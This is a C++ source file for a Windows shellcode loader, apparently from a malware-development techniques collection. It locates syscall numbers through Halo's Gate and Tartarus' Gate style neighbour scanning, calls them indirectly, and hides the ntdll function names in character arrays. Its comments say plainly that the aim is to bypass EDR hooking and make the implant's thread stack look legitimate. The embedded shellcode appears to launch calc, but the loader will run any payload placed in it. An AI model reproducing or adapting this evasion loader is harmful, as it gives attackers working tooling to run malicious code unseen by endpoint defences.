#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h> 
#include <string>

#pragma comment (lib, "ntdll.lib")		// For the Usage of Nt Functions

#define NT_SUCCESS(Status)	(((NTSTATUS)(Status)) >= 0)		// Macro defined in ntapi.h

// [link: https://www.codeproject.com/Questions/103661/how-to-get-current-Process-HANDLE]
// Return value of currentProcess() is a pseudo handle to the current process
// => (HANDLE)-1 => 0xFFFFFFFF" (MSDN)
#define MyCurrentProcess()	((HANDLE)-1)

// HalosGate: Sektor7
#define UP -32
#define DOWN 32

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

EXTERN_C NTSTATUS NtWriteVirtualMemory(

    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN SIZE_T                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
);


EXTERN_C NTSTATUS NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);


EXTERN_C NTSTATUS NtWaitForSingleObject(
	IN HANDLE         Handle,
	IN BOOLEAN        Alertable,
	IN PLARGE_INTEGER Timeout
);

/*
// Code: https://evasions.checkpoint.com/techniques/timing.html
EXTERN_C NTSTATUS NtDelayExecution(
	IN BOOLEAN              Alertable,
	IN PLARGE_INTEGER       DelayInterval
);
*/


// Declare global variables to hold syscall numbers and syscall instruction addresses
EXTERN_C VOID GetSyscall(WORD SSN);
EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAddr);

// Ntapi obfuscation:

const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
const char NtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
const char NtWrite[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
const char NtCreateTh[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0 };
const char NtWait[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0 };

void int2hex(int SystemCall)
{
	char hex_string[20];
	sprintf(hex_string, "%X", SystemCall); //convert number to hex
	printf("[+] Sorted SSN %s\n", hex_string);
}

WORD SortSSN(LPVOID ntapiaddr)
{
	WORD SystemCall = NULL;

	// Whole SystemCall Stub:
	// First Opcode should be: (If Not Hooked)
	// mov r10, rcx
	// mov rcx, SSN
	if (*((PBYTE)ntapiaddr) == 0x4c
		&& *((PBYTE)ntapiaddr + 1) == 0x8b
		&& *((PBYTE)ntapiaddr + 2) == 0xd1
		&& *((PBYTE)ntapiaddr + 3) == 0xb8
		&& *((PBYTE)ntapiaddr + 6) == 0x00
		&& *((PBYTE)ntapiaddr + 7) == 0x00)
	{
		BYTE high = *((PBYTE)ntapiaddr + 5);
		BYTE low = *((PBYTE)ntapiaddr + 4);
		SystemCall = (high << 8) | low;

		int2hex(SystemCall);

		return SystemCall;
	}

	// if (*((PBYTE)ntapiaddr) == 0xe9)	
	
	// If Hooked: jmp <instructions>
	// opcode: \xe9...

	// Why So Many Checking of Jumps???
	//
	// 1. Hell's Gate or Modified Hells Gate, Halos Gate: Only Checks if first instruction is a JMP
	// 
	// 2. Modified Halos Gate, TartarusGate: Only Checks if first or third instruction is a JMP
	// 
	// 3. These Combination is again Modified from TartarusGate: Checks if first, third, eighth, tenth, twelveth instruction is a JMP
	// 
	// => More EDR bypass -> More EDR, More Diverse way of hooking APIs 
	// 
	if (*((PBYTE)ntapiaddr) == 0xe9 || *((PBYTE)ntapiaddr + 3) == 0xe9 || *((PBYTE)ntapiaddr + 8) == 0xe9 ||
		*((PBYTE)ntapiaddr + 10) == 0xe9 || *((PBYTE)ntapiaddr + 12) == 0xe9)
	{
		for (WORD idx = 1; idx <= 500; idx++)
		{
			// Check neighbouring Syscall Down the stack:
			if (*((PBYTE)ntapiaddr + idx * DOWN) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * DOWN) == 0x00)
			{

				BYTE high = *((PBYTE)ntapiaddr + 5 + idx * DOWN);
				BYTE low = *((PBYTE)ntapiaddr + 4 + idx * DOWN);
				SystemCall = (high << 8) | low - idx;

				int2hex(SystemCall);

				return SystemCall;
			}

			// Check neighbouring Syscall Up the stack:
			if (*((PBYTE)ntapiaddr + idx * UP) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * UP) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * UP) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * UP) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * UP) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * UP) == 0x00)
			{
				BYTE high = *((PBYTE)ntapiaddr + 5 + idx * UP);
				BYTE low = *((PBYTE)ntapiaddr + 4 + idx * UP);
				SystemCall = (high << 8) | low + idx;

				int2hex(SystemCall);

				return SystemCall;
			}
		}
	}
}

// Sektor7: HalosGate -> hellsgate.asm
DWORD64 GetsyscallInstr(LPVOID ntapiaddr)
{
	WORD SystemCall = NULL;

	if (*((PBYTE)ntapiaddr) == 0x4c
		&& *((PBYTE)ntapiaddr + 1) == 0x8b
		&& *((PBYTE)ntapiaddr + 2) == 0xd1
		&& *((PBYTE)ntapiaddr + 3) == 0xb8
		&& *((PBYTE)ntapiaddr + 6) == 0x00
		&& *((PBYTE)ntapiaddr + 7) == 0x00)
	{
		// https://github.com/reveng007/MaldevTechniques/tree/main/3.Evasions/SSN_Sort_patch_Hooked_syscalls/project_vs_2022#to-get-syscall-instuction-calculation
		return (INT_PTR)ntapiaddr + 0x12;    // Syscall
	}

	// if (*((PBYTE)ntapiaddr) == 0xe9)	

	// If Hooked: jmp <instructions>
	// opcode: \xe9...

	// Why So Many Checking of Jumps???
	//
	// 1. Hell's Gate or Modified Hells Gate, Halos Gate: Only Checks if first instruction is a JMP
	// 
	// 2. Modified Halos Gate, TartarusGate: Only Checks if first or third instruction is a JMP
	// 
	// 3. These Combination is again Modified from TartarusGate: Checks if first, third, eighth, tenth, twelveth instruction is a JMP
	// 
	// => More EDR bypass -> More EDR, More Diverse way of hooking APIs 
	// 
	if (*((PBYTE)ntapiaddr) == 0xe9 || *((PBYTE)ntapiaddr + 3) == 0xe9 || *((PBYTE)ntapiaddr + 8) == 0xe9 ||
		*((PBYTE)ntapiaddr + 10) == 0xe9 || *((PBYTE)ntapiaddr + 12) == 0xe9)
	{
		for (WORD idx = 1; idx <= 500; idx++)
		{
			// Check neighbouring Syscall Down the stack:
			if (*((PBYTE)ntapiaddr + idx * DOWN) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * DOWN) == 0x00)
			{
				return (INT_PTR)ntapiaddr + 0x12;	// syscall
			}

			// Check neighbouring Syscall Up the stack:
			if (*((PBYTE)ntapiaddr + idx * UP) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * UP) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * UP) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * UP) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * UP) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * UP) == 0x00)
			{
				return (INT_PTR)ntapiaddr + 0x12;	// syscall
			}
		}
	}
}

int main()
{
	// Define the shellcode to be injected
	unsigned char enc_shellcode_bin[] = "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B\x6F\x87\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x63\x61\x6C\x63\x00";

	PVOID BaseAddress = NULL;
	unsigned int shellcode_size = sizeof(enc_shellcode_bin);
	int ret = 0;

	// SIZE_T shellcode variable for NT api operation
	SIZE_T shellcode_size2 = sizeof(enc_shellcode_bin);
	ULONG shcSize = (ULONG)shellcode_size;

	WORD syscallNum = NULL;
	INT_PTR syscallAddress = NULL;	

	// ================ NtAllocateVirtualMemory() =============================
	
	LPVOID pNtAlloc = GetProcAddress(GetModuleHandleA(ntdll), NtAlloc);

	syscallNum = SortSSN(pNtAlloc);
	syscallAddress = GetsyscallInstr(pNtAlloc);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS status1 = NtAllocateVirtualMemory(MyCurrentProcess(), &BaseAddress, 0, &shellcode_size2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!NT_SUCCESS(status1))
	{
		printf("[!] Failed in NtAllocateVirtualMemory (%u)\n", GetLastError());
		return 1;
	}

	// ================ End: NtAllocateVirtualMemory() =============================


	// ================ NtWriteVirtualMemory() =================================

	LPVOID pNtWrite = GetProcAddress(GetModuleHandleA(ntdll), NtWrite);

	syscallNum = SortSSN(pNtWrite);
	syscallAddress = GetsyscallInstr(pNtWrite);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS  NtWriteStatus1 = NtWriteVirtualMemory(MyCurrentProcess(), BaseAddress, enc_shellcode_bin, shcSize, NULL);

	if (!NT_SUCCESS(NtWriteStatus1))
	{
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return 1;
	}

	// ================ End: NtWriteVirtualMemory() =================================


	// ========================= NtProtectVirtualMemory() =============================

	HANDLE hThread;
	DWORD OldProtect = 0;

	LPVOID pNtProtect = GetProcAddress(GetModuleHandleA(ntdll), NtProtect);

	syscallNum = SortSSN(pNtProtect);
	syscallAddress = GetsyscallInstr(pNtProtect);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(MyCurrentProcess(), &BaseAddress, &shellcode_size2, PAGE_EXECUTE_READ, &OldProtect);

	if (!NT_SUCCESS(NtProtectStatus1))
	{
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return 1;
	}

	// ========================= End: NtProtectVirtualMemory() =============================


	// ============================= NtCreateThreadEx() ====================================

	LPVOID pNtCreateTh = GetProcAddress(GetModuleHandleA(ntdll), NtCreateTh);

	syscallNum = SortSSN(pNtCreateTh);
	syscallAddress = GetsyscallInstr(pNtCreateTh);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, MyCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	if (!NT_SUCCESS(NtCreateThreadstatus))
	{
		printf("[!] Failed in NtCreateThreadEx (%u)\n", GetLastError());
		return 1;
	}

	// ============================= End: NtCreateThreadEx() ====================================

	// Just Uncomment this and compile -> Execute and open the implant process in process hacker -> check thread Stack -> It's totally Legit 
	// 
	// 1. Top of the stack will indeed show ntoskrnl.exe as 
	// => ProcessHacker has a Driver inbuilt which will see beyond the call to ntdll and into ntoskrnl (kernel)
	// 
	// 2. Compared with legit notepad, stack looks identical 
	//		i. => Nt functions are present at the top of the Stack (Leaving, the "ntoskrnl.exe is on TOP of CallStack" factor)
	// 
	//		ii. => Nt functions are retrieved from ntdll itself, NOT from implant process 

	/*
	LARGE_INTEGER SleepUntil;
	//LARGE_INTEGER SleepTo;

	const char NtDelay[] = { 'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n', 0 };

	LPVOID pNtDelay = GetProcAddress(GetModuleHandleA(ntdll), NtDelay);

	syscallNum = SortSSN(pNtDelay);
	syscallAddress = GetsyscallInstr(pNtDelay);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	DWORD ms = 10000;

	// Code: https://evasions.checkpoint.com/techniques/timing.html
	GetSystemTimeAsFileTime((LPFILETIME)&SleepUntil);
	SleepUntil.QuadPart += (ms * 10000);

	NTSTATUS NTDelaystatus = NtDelayExecution(TRUE, &SleepUntil);

	if (!NT_SUCCESS(NTDelaystatus))
	{
		printf("[!] Failed in NtDelayExecution (%u)\n", GetLastError());
		return 1;
	}
	*/

	// ============================== NtWaitForSingleObject() ====================================

	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;

	LPVOID pNtWait = GetProcAddress(GetModuleHandleA(ntdll), NtWait);

	syscallNum = SortSSN(pNtWait);
	syscallAddress = GetsyscallInstr(pNtWait);

	// Indirect Syscall
	GetSyscall(syscallNum);
	GetSyscallAddr(syscallAddress);

	NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hThread, FALSE, &Timeout);
	
	if (!NT_SUCCESS(NTWFSOstatus))
	{
		printf("[!] Failed in NtWaitForSingleObject (%u)\n", GetLastError());
		return 1;
	}

	//getchar();

	// ============================== End: NtWaitForSingleObject() =================================

	// ==============================

	return 0;
}